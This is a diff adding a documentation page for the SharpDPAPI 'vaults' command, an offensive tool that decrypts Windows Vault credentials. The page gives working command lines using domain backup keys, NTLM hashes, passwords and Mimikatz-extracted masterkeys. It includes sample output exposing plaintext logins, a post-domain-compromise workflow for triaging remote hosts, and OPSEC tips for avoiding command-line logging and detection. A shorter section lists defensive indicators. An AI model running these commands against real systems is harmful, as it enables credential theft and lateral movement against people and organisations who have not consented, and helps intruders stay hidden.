@@ -1,0 +1,415 @@
+---
+title: 'vaults'
+description: 'Decrypt Windows Vault credential data'
+icon: 'vault'
+---
+
+## Overview
+
+The **vaults** command searches for Windows Vault folders and decrypts their contents using masterkeys, domain backup keys, or user credentials. Vaults contain web credentials, Internet Explorer passwords, and other sensitive authentication data.
+
+<Info>
+  Windows Vaults are stored in `%LOCALAPPDATA%\Microsoft\Vault\` and contain credentials for web browsers, network resources, and Windows applications.
+</Info>
+
+## Basic Usage
+
+```bash
+# Decrypt with domain backup key
+SharpDPAPI.exe vaults /pvk:key.pvk
+
+# Decrypt with masterkey mappings
+SharpDPAPI.exe vaults {GUID1}:SHA1 {GUID2}:SHA1
+
+# Decrypt with user password
+SharpDPAPI.exe vaults /password:Password123!
+
+# Target specific vault folder
+SharpDPAPI.exe vaults /target:C:\Path\To\Vault\Folder /pvk:key.pvk
+```
+
+## Command Arguments
+
+### Decryption Methods
+
+<Tabs>
+  <Tab title="Domain Backup Key">
+    ```bash
+    # Base64-encoded key
+    SharpDPAPI.exe vaults /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+
+    # Key file
+    SharpDPAPI.exe vaults /pvk:key.pvk
+    ```
+
+    First decrypts user masterkeys, then uses them to decrypt vault Policy.vpol and .vcrd files.
+  </Tab>
+
+  <Tab title="Masterkey Mappings">
+    ```bash
+    # Inline masterkeys
+    SharpDPAPI.exe vaults {GUID1}:SHA1 {GUID2}:SHA1
+
+    # Masterkey file
+    SharpDPAPI.exe vaults /mkfile:masterkeys.txt
+    ```
+
+    Directly uses pre-decrypted masterkeys for vault decryption.
+  </Tab>
+
+  <Tab title="User Credentials">
+    ```bash
+    # Plaintext password
+    SharpDPAPI.exe vaults /password:Password123!
+
+    # NTLM hash
+    SharpDPAPI.exe vaults /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+
+    # DPAPI credkey
+    SharpDPAPI.exe vaults /credkey:abc123...
+    ```
+
+    Decrypts user masterkeys first, then vault data.
+  </Tab>
+
+  <Tab title="RPC Decryption">
+    ```bash
+    # Decrypt via domain controller
+    SharpDPAPI.exe vaults /rpc
+    ```
+
+    Asks domain controller to decrypt masterkeys remotely.
+  </Tab>
+</Tabs>
+
+### Targeting Options
+
+| Argument | Description |
+|----------|-------------|
+| `/target:FOLDER` | Target specific vault folder |
+| `/server:SERVER` | Triage remote server (requires admin access + pvk/password) |
+
+<Note>
+  When using `/target:FOLDER`, the folder must either contain {GUID}:SHA1 masterkeys in the command line, or contain DPAPI masterkey files with a `/pvk` backup key supplied.
+</Note>
+
+## How Vaults Work
+
+Windows Vaults use a two-stage encryption process:
+
+<Steps>
+  <Step title="Policy File Decryption">
+    The `Policy.vpol` file is encrypted with user's DPAPI masterkey and contains AES encryption keys
+  </Step>
+
+  <Step title="AES Key Extraction">
+    Decrypting Policy.vpol reveals AES128 and AES256 keys used for credential encryption
+  </Step>
+
+  <Step title="Credential Decryption">
+    The AES keys decrypt `.vcrd` credential files containing usernames and passwords
+  </Step>
+</Steps>
+
+## Execution Context
+
+<Tabs>
+  <Tab title="Elevated">
+    When run with administrative privileges:
+    - Triages **all users** on the system
+    - Accesses vault folders in all user profiles
+    - Maximum credential recovery
+  </Tab>
+
+  <Tab title="Unelevated">
+    When run without elevation:
+    - Only triages **current user**
+    - Limited to current user's vault folders
+    - More OPSEC-friendly
+  </Tab>
+</Tabs>
+
+## Example: Using Masterkey Mappings
+
+```bash
+SharpDPAPI.exe vaults {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab89937687... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903...
+```
+
+**Output:**
+```
+[*] Action: User DPAPI Vault Triage
+
+[*] Triaging Vaults for ALL users
+
+[*] Triaging Vault folder: C:\Users\harmj0y\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+
+  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
+  Name               : Web Credentials
+    guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}
+    size             : 240
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32772/26115
+    description      :
+    aes128 key       : EDB42294C0721F2F1638A40F0CD67CD8
+    aes256 key       : 84CD64B5F438B8B9DA15238A5CFA418C04F9BED6B4B4CCAC9705C36C65B5E793
+
+    LastWritten      : 10/12/2018 12:10:42 PM
+    FriendlyName     : Internet Explorer
+    Identity         : admin
+    Resource         : https://10.0.0.1/
+    Authenticator    : Password!
+```
+
+<Tip>
+  The AES keys shown are extracted from Policy.vpol and used to decrypt the credential (.vcrd) files.
+</Tip>
+
+## Example: Using Domain Backup Key
+
+```bash
+SharpDPAPI.exe vaults /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+```
+
+**Output:**
+```
+[*] Action: DPAPI Vault Triage
+
+[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!
+
+[*] User master key cache:
+
+{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665
+{feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903a9b61c42e6c9ab0f4
+
+[*] Triaging Vaults for ALL users
+
+[*] Triaging Vault folder: C:\Users\harmj0y\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+
+  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
+  Name               : Web Credentials
+    guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}
+    size             : 240
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32772/26115
+    description      :
+    aes128 key       : EDB42294C0721F2F1638A40F0CD67CD8
+    aes256 key       : 84CD64B5F438B8B9DA15238A5CFA418C04F9BED6B4B4CCAC9705C36C65B5E793
+
+    LastWritten      : 10/12/2018 12:10:42 PM
+    FriendlyName     : Internet Explorer
+    Identity         : admin
+    Resource         : https://10.0.0.1/
+    Authenticator    : Password!
+```
+
+## Example: Offline/Forensic Analysis
+
+```bash
+SharpDPAPI.exe vaults /target:C:\Temp\test\ /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+```
+
+**Output:**
+```
+[*] Action: User DPAPI Vault Triage
+
+[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!
+
+[*] User master key cache:
+
+{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665
+
+[*] Target Vault Folder: C:\Temp\test\
+
+[*] Triaging Vault folder: C:\Temp\test\
+
+  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
+  Name               : Web Credentials
+    guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}
+    size             : 240
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32772/26115
+    description      :
+    aes128 key       : EDB42294C0721F2F1638A40F0CD67CD8
+    aes256 key       : 84CD64B5F438B8B9DA15238A5CFA418C04F9BED6B4B4CCAC9705C36C65B5E793
+
+    LastWritten      : 3/20/2019 6:03:50 AM
+    FriendlyName     : Internet Explorer
+    Identity         : account
+    Resource         : http://www.abc.com/
+    Authenticator    : password
+```
+
+## Types of Vault Data
+
+<AccordionGroup>
+  <Accordion title="Web Credentials">
+    - **VaultID**: `4bf4c442-9b8a-41a0-b380-dd4a704ddb28`
+    - Internet Explorer saved passwords
+    - Edge (legacy) saved credentials
+    - Web form authentication data
+  </Accordion>
+
+  <Accordion title="Windows Credentials">
+    - **VaultID**: `2f1a6504-0641-44cf-8bb5-3612d865f2e5`
+    - Network authentication credentials
+    - Windows domain credentials
+    - Generic Windows passwords
+  </Accordion>
+
+  <Accordion title="Application Credentials">
+    - Application-specific saved credentials
+    - Third-party application passwords
+    - Windows service credentials
+  </Accordion>
+</AccordionGroup>
+
+## Vault File Structure
+
+Vaults are located at:
+```
+%LOCALAPPDATA%\Microsoft\Vault\{VAULT-GUID}\
+```
+
+Each vault folder contains:
+- **Policy.vpol**: DPAPI-encrypted AES keys
+- **\*.vcrd**: AES-encrypted credential files
+- **Credentials**: Subdirectory with additional credential files
+
+## Common Scenarios
+
+<AccordionGroup>
+  <Accordion title="Post-Domain Compromise">
+    After obtaining domain admin and the backup key:
+
+    ```bash
+    # 1. Retrieve backup key
+    SharpDPAPI.exe backupkey /file:key.pvk
+
+    # 2. Decrypt vaults locally
+    SharpDPAPI.exe vaults /pvk:key.pvk
+
+    # 3. Decrypt vaults on remote systems
+    SharpDPAPI.exe vaults /pvk:key.pvk /server:workstation01.domain.com
+    SharpDPAPI.exe vaults /pvk:key.pvk /server:fileserver.domain.com
+    ```
+  </Accordion>
+
+  <Accordion title="Using Mimikatz-Extracted Masterkeys">
+    Extract masterkeys with Mimikatz and use for vault decryption:
+
+    ```bash
+    # 1. In Mimikatz
+    # mimikatz# privilege::debug
+    # mimikatz# sekurlsa::dpapi
+
+    # 2. Format as {GUID}:SHA1 {GUID}:SHA1
+    # 3. Run SharpDPAPI
+    SharpDPAPI.exe vaults {8abc35b1-b718-4a86-9781-7fd7f37101dd}:ae349cdd... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad...
+    ```
+  </Accordion>
+
+  <Accordion title="Specific User Credentials">
+    When you have a user's password or hash:
+
+    ```bash
+    # Using plaintext password
+    SharpDPAPI.exe vaults /password:Password123!
+
+    # Using NTLM hash
+    SharpDPAPI.exe vaults /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+    ```
+  </Accordion>
+
+  <Accordion title="Offline Vault Analysis">
+    Analyzing copied vault folders:
+
+    ```bash
+    # Target specific vault folder with backup key
+    SharpDPAPI.exe vaults /target:C:\Evidence\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\ /pvk:key.pvk
+
+    # Target vault with masterkey mappings
+    SharpDPAPI.exe vaults /target:C:\Evidence\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\ {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad...
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Detection Considerations
+
+<Warning>
+  Accessing vault files can trigger security monitoring and endpoint detection systems.
+</Warning>
+
+**Host-Based Indicators:**
+- Reading files from `%LOCALAPPDATA%\Microsoft\Vault\`
+- Non-standard processes accessing Policy.vpol files
+- Bulk enumeration of vault folders across user profiles
+- Access to .vcrd credential files
+
+**Defensive Monitoring:**
+- Monitor access to `%LOCALAPPDATA%\Microsoft\Vault\` directories
+- Alert on Policy.vpol file access
+- Track processes reading vault credential files
+- Detect vault access from unauthorized processes
+- Monitor for bulk vault enumeration
+
+**Event Log Indicators:**
+```
+Event ID: 4663 (File Access)
+Object Name: *\Microsoft\Vault\*
+Object Name: *\Policy.vpol
+Object Name: *\.vcrd
+```
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="credentials" icon="id-card" href="/ghostpack-docs/SharpDPAPI-mdx/commands/credentials">
+    Decrypt Credential Manager files
+  </Card>
+  <Card title="masterkeys" icon="key" href="/ghostpack-docs/SharpDPAPI-mdx/commands/masterkeys">
+    Decrypt user masterkeys first
+  </Card>
+  <Card title="triage" icon="list-check" href="/ghostpack-docs/SharpDPAPI-mdx/commands/triage">
+    Comprehensive user DPAPI triage
+  </Card>
+  <Card title="backupkey" icon="download" href="/ghostpack-docs/SharpDPAPI-mdx/commands/backupkey">
+    Retrieve domain backup key
+  </Card>
+</CardGroup>
+
+## Tips
+
+<Accordion title="Maximizing Vault Recovery">
+  - Run elevated to access all users' vaults
+  - Use domain backup key for comprehensive coverage
+  - Check multiple vault GUIDs (Web Credentials, Windows Credentials)
+  - Pay attention to FriendlyName field for credential source
+  - Correlate Resource URLs with target infrastructure
+</Accordion>
+
+<Accordion title="OPSEC Considerations">
+  - Run unelevated to only access current user (less noisy)
+  - Use `/mkfile` instead of inline masterkeys to avoid command line logging
+  - Target specific vault folders if you know what you're looking for
+  - Redirect output to file with `/consoleoutfile`
+  - Avoid bulk enumeration if stealth is required
+</Accordion>
+
+<Accordion title="Troubleshooting">
+  **No vaults decrypted:**
+  - Verify masterkeys or backup key is correct
+  - Check that vault folders actually exist
+  - Ensure you have read permissions to vault directories
+  - Confirm Policy.vpol file exists in vault folder
+
+  **Policy decrypted but no credentials:**
+  - Vault may be empty (no .vcrd files)
+  - Check for Credentials subdirectory
+  - Verify AES keys were extracted from Policy.vpol
+  - Some vaults may not contain credential entries
+
+  **Partial decryption:**
+  - Different vaults may use different masterkeys
+  - Extract more masterkeys using Mimikatz
+  - Use domain backup key for complete coverage
+</Accordion>
